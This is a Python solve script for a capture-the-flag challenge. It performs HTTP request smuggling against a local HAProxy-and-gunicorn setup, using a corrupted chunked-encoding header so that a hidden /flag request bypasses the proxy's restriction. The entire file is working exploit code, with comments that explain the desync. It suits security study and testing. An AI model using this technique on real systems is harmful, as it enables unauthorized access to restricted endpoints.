#!/usr/bin/env python3
import socket
from request_builder import Request_Builder

HOST = '0.0.0.0'
PORT = 8001

# https://ctftime.org/writeup/20655
# HAProxy uses the content length header (CL), because HAProxy ignores chunked encoding header due to adding the character 0x0b
# by aligning the content length properly it will include the flag request as part of the body for HAProxy allowing to bypass the /flag restriction
# gunicorn will use the chunked encoding header (TE), meaning the body of the hello_request will end after the 0
# so it sees flag_request as a new request instead of part of the body of the hello_request
# gunicorn will handle them separately as two requests, resulting in two responses back to HAProxy
# to retrieve the second response we send an extra request

flag_request_builder = Request_Builder()
flag_request_builder.url = "/flag"
flag_request_builder.host = "{}:{}".format(HOST, PORT)
flag_request = flag_request_builder.build()

hello_request_builder = Request_Builder()
hello_request_builder.url = "/hello"
hello_request_builder.host = "{}:{}".format(HOST, PORT)
hello_request_builder.add_content_length_header = True
# body is empty, because we the flag request after manually
# but for HAProxy the content-length must be big enough to include the flag request so it will be smuggled
# we want to smuggle the chunked encoding length ('0' and two line break) and the flag_request
hello_request_builder.content_length_offset = len("0\r\n\r\n") + len(flag_request)
hello_request_builder.add_chunked_encoding_header = True
hello_request_builder.add_chunked_encoding_header_value = ""
hello_request_builder.add_chunked_encoding_body = True
hello_request = hello_request_builder.build()

extra_request_builder = Request_Builder()
extra_request_builder.url = "/hello"
extra_request_builder.host = "{}:{}".format(HOST, PORT)
extra_request = extra_request_builder.build()

msg = hello_request + flag_request + extra_request
print("SEND:")
print(msg)
print("RAW:")
print(msg.encode("ascii"))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(msg.encode("ascii"))
    response = s.recv(1024).decode("ascii")
    print("RECEIVED:")
    print(response)
    response = s.recv(1024).decode("ascii")
    print("RECEIVED:")
    print(response)
